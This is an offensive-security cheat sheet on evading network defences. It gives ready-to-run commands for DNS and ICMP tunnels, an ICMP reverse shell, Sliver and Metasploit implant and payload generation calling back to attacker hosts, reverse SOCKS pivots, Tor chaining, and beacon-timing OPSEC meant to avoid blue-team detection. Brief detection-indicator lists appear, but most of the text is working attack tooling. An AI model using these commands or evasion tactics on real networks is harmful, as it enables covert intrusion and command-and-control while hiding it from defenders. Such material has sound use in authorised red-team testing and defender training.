# Network Evasion Techniques

## Decision Tree: Choosing Your Tunnel/C2 Channel

1. **What egress is allowed?**
   - Only DNS (UDP/53) → DNS tunneling (dnscat2 for C2, iodine for full IP tunnel)
   - Only ICMP → ICMP tunneling (ptunnel-ng)
   - HTTP/HTTPS allowed → Encrypted C2 (Sliver HTTPS/mTLS, Empire HTTPS, Metasploit reverse_https)
   - SSH outbound allowed → SSH tunnels (-L, -R, -D)
   - No direct egress but internal pivot available → SMB pipes (Covenant), named pipes (Sliver), SSH ProxyJump

2. **C2 vs full tunnel?**
   - Need interactive shell + modules → C2 framework (Sliver, Empire, Covenant)
   - Need to route arbitrary tools/traffic → IP tunnel (iodine, SSH -D, Chisel, ptunnel-ng)

3. **Stealth priority?**
   - Maximum stealth → mTLS/WireGuard (Sliver), long beacon intervals, working-hours callbacks
   - Moderate stealth → HTTPS with valid cert + malleable profiles
   - Speed over stealth → direct connections, short sleep intervals

## DNS Tunneling — T1071.004, T1572

### dnscat2 (C2 over DNS)
```bash
# Server (requires authoritative NS for domain)
ruby dnscat2.rb c2.example.com
# Client
./dnscat c2.example.com
# Port forward through DNS tunnel
command> listen 0.0.0.0:4444 10.0.0.5:445
```

### iodine (IP-over-DNS, full tunnel)
```bash
# Server
iodined -f -c -P password 10.0.0.1/24 t1.example.com
# Client
iodine -f -P password t1.example.com
# Layer SSH for encryption + SOCKS
ssh -N -D 1080 user@10.0.0.1
proxychains4 nmap -sT 10.0.0.0/24
```

### When to use which
- dnscat2: encrypted by default, purpose-built C2, interactive shells + port forwarding
- iodine: raw IP tunnel, higher throughput (~50-100 KB/s vs ~KB/s), NOT encrypted (layer SSH)

### Detection indicators (DNS tunneling)
- High query volume to single domain, long high-entropy subdomains, abnormal TXT/NULL record frequency, periodic beacon patterns

## ICMP Tunneling — T1572

### ptunnel-ng (TCP over ICMP)
```bash
# Server (attacker — listens for ICMP)
ptunnel-ng -r <attacker_ip> -R 22
# Client (compromised host — tunnels TCP through ICMP)
ptunnel-ng -p <server_ip> -lp 8000 -da <attacker_ip> -dp 22
# SSH through the ICMP tunnel
ssh -p 8000 user@127.0.0.1
```

### icmpsh (ICMP reverse shell)
```bash
# Attacker: disable kernel ICMP replies, start listener
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py <attacker_ip> <victim_ip>
# Victim (Windows)
icmpsh.exe -t <attacker_ip>
```

### Detection indicators (ICMP)
- Unusually large ICMP packets (>64 bytes), high ICMP traffic volume, ICMP echo with data payloads, bidirectional ICMP between two hosts

## Encrypted C2 Channels — T1573

### Sliver mTLS/WireGuard (strongest)
```bash
mtls --lhost 0.0.0.0 --lport 8888
generate --mtls attacker.com --os windows --save /tmp/implant.exe
# WireGuard variant
wg --lport 53 --nport 8888 --key-port 1337
generate --wg attacker.com --os windows --save /tmp/wg.exe
```

### Sliver/Empire HTTPS with valid cert
```bash
# Sliver — Let's Encrypt auto-cert
https --lhost 0.0.0.0 --lport 443 --domain c2.example.com --lets-encrypt
generate beacon --http c2.example.com --save /tmp/beacon.exe
# Empire — custom cert
uselistener http → set Host https://attacker.com:443 → set CertPath /path/cert.pem → execute
```

### Metasploit reverse_https with cert pinning
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
  StagerVerifySSLCert=true HandlerSSLCert=/path/cert.pem -f exe -o payload.exe
# Handler: set StagerVerifySSLCert true, set HandlerSSLCert /path/cert.pem
```

### Detection indicators (encrypted C2)
- mTLS on non-standard ports, self-signed or unusual cert chains, JA3/JA3S fingerprints matching known C2, beaconing intervals to single endpoint

## Traffic Blending — T1071.001

- Use port 443 with valid TLS certs (Let's Encrypt) — defeats basic SSL inspection
- Malleable C2 profiles: Empire Malleable HTTP, Sliver procedural HTTP URLs — mimic jQuery, Amazon, Microsoft traffic
- Match User-Agent to target environment (check what browsers/OS are in use)
- Domain fronting (CDN abuse): HTTPS to CDN IP, Host header routes to C2 — largely patched on AWS/Azure/GCP but some CDNs still allow
- CDN-based C2: put C2 server behind Cloudflare/CloudFront — traffic originates from trusted CDN IP ranges, C2 IP hidden

### Detection indicators (traffic blending)
- Beaconing pattern analysis (fixed intervals even with jitter), unusual HTTP header combinations, high volume to new/uncategorized domains, TLS cert metadata anomalies

## Proxy Chains — T1090

### proxychains4
```bash
# Route any tool through SOCKS proxy
proxychains4 nmap -sT -Pn 10.0.0.0/24
proxychains4 evil-winrm -i dc01 -u admin
proxychains4 curl http://internal-target
# Config (/etc/proxychains4.conf): socks5 127.0.0.1 1080
# Chain multiple: list proxies in order (strict_chain mode)
```

### Tor
```bash
tor                                    # Starts SOCKS proxy on 127.0.0.1:9050
proxychains4 -f /etc/proxychains-tor.conf nmap -sT target
# Double anonymity: Sliver SOCKS5 (1080) → Tor (9050) → Internet
```

### Chisel (TCP tunnels over HTTP)
```bash
# Server (attacker)
chisel server --reverse --port 8080
# Client (compromised host) — reverse SOCKS proxy
chisel client attacker.com:8080 R:1080:socks
# Then: proxychains4 with socks5 127.0.0.1 1080
```

## SSH Tunnels — T1572, T1090

```bash
# Local port forward — access remote:80 as localhost:8080
ssh -N -L 8080:remote_host:80 pivot@target
# Remote port forward — expose attacker:4444 on target
ssh -N -R 4444:127.0.0.1:4444 pivot@target
# Dynamic SOCKS proxy — route tools through pivot
ssh -N -D 1080 pivot@target
proxychains4 nmap -sT -Pn 10.0.0.0/24
# Multi-hop
ssh -J user1@hop1,user2@hop2 user3@final_target
# Keep alive
ssh -N -D 1080 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 pivot@target
```

## Traffic Timing & Beacon Behavior — T1029

```bash
# Sliver: 5min sleep, 50% jitter
generate beacon --http attacker.com --seconds 300 --jitter 50
# Empire: 60s sleep, 30% jitter
sleep 60 30
# Covenant: set Delay=60, JitterPercent=30 in Grunt GUI
# Metasploit: set_timeouts -c 60 -x 30
# Long-haul sleeper (4-8 hour check-in)
generate beacon --http attacker.com --seconds 21600 --jitter 50
```

### Timing OPSEC
- Avoid fixed intervals (SOC fingerprints predictable beacons)
- Working-hours callbacks (9-5) blend with user activity
- Gradually increase sleep after initial access
- Kill beacons if blue team activity detected

## MITRE ATT&CK Summary

| ID | Technique | Tools/Methods |
|----|-----------|---------------|
| T1071.001 | Web Protocols | Sliver HTTPS, Empire HTTPS, Metasploit reverse_https |
| T1071.004 | DNS | dnscat2, iodine, Sliver DNS |
| T1572 | Protocol Tunneling | iodine, dnscat2, ptunnel-ng, SSH tunnels, Chisel |
| T1573 | Encrypted Channel | Sliver mTLS/WG, Empire HTTPS, cert-pinned payloads |
| T1090 | Proxy | proxychains4, Tor, SSH -D, Sliver socks5, Chisel |
| T1048 | Exfil Over Alt Protocol | DNS exfil, ICMP exfil |
| T1029 | Scheduled Transfer | Beacon jitter/sleep, working-hours callbacks |
